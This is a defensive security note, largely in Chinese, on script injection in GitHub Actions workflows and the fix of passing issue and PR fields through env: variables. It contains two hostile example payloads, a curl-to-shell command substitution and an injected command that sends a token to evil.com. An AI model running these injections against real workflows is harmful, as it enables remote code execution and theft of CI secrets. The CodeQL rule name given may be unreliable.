---
{"title": "GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation", "domain": "security", "source": "codewhale", "status": "published", "tags": ["github-actions", "security", "code-injection", "codeql", "ci"], "created": "2026-06-10 00:00:00 UTC", "updated": "2026-06-10 00:00:00 UTC", "domain_expert": "codewhale", "verified_date": "2026-06-10"}
---

## Root Cause

当 GitHub Actions 的 `run:` 脚本中直接使用 `${{ github.event.issue.body }}` 或 `${{ github.event.pull_request.title }}` 等用户可控变量时，攻击者可以通过构造包含 shell 元字符（如 `` ` ``, `$(...)`, `;`）的 issue/PR 内容来注入任意命令。

```yaml
# GitHub Actions Script Injection — Use env Variables Instead of Inline Interpolation
- run: |
    BODY="${{ github.event.issue.body }}"
    echo "$BODY" | grep "keyword"
```

如果 issue body 是 `"$(curl http://evil/payload.sh | sh)"`，展开后变成：
```bash
BODY="$(curl http://evil/payload.sh | sh)"
```

## Solution

将用户可控的上下文变量通过 `env:` 传递，而不是直接内联到 `run:` 脚本中：

```yaml
# ✅ 安全：通过 env 变量传递
- run: |
    echo "$ISSUE_BODY" | grep "keyword"
  env:
    ISSUE_BODY: ${{ github.event.issue.body }}
```

GitHub Actions 在 `env:` 中对 `${{ }}` 求值并写入环境变量值，shell 不会对其中的特殊字符做二次解析。

### 完整修复示例

```yaml
# Before (vulnerable)
- run: |
    TITLE="${{ github.event.issue.title }}"
    if echo "$TITLE" | grep -qi "bug"; then echo "is bug"; fi

# After (safe)
- run: |
    if echo "$ISSUE_TITLE" | grep -qi "bug"; then echo "is bug"; fi
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
```

### CodeQL 检测规则

GitHub CodeQL 的 "Code injection" 规则（`cs/code-injection`）会自动检测此类问题。触发条件：
- `${{ }}` 表达式出现在 `run:` 脚本中
- 表达式来源是用户可控的上下文（`github.event.issue.body`, `github.event.pull_request.title`, `github.event.comment.body` 等）
- 评级：**critical**

## Lesson

## Verification

1. Create a workflow with `run: echo ${{ github.event.issue.title }}` — confirm CodeQL alerts on code injection
2. Refactor to use `env: { TITLE: ${{ github.event.issue.title }} }` + `run: echo "$TITLE"` — confirm alert clears
3. Test with a malicious payload in issue title containing `" && curl evil.com/$TOKEN"` — confirm env quoting prevents injection
4. Verify CodeQL cs/code-injection rule is not dismissed as false positive in the PR

- 任何时候 `${{ }}` 的值来自用户输入（issue body、PR title、comment 等），都必须通过 `env:` 间接传递
- 安全原则：`run:` 脚本中只使用字面量和环境变量，不内联表达式
- CodeQL 的 cs/code-injection 规则是可靠的——不要 dismiss 为 false positive
- 这条规则适用于所有 workflow 类型，包括 `issue_comment`、`issues`、`pull_request`、`discussion` 等事件
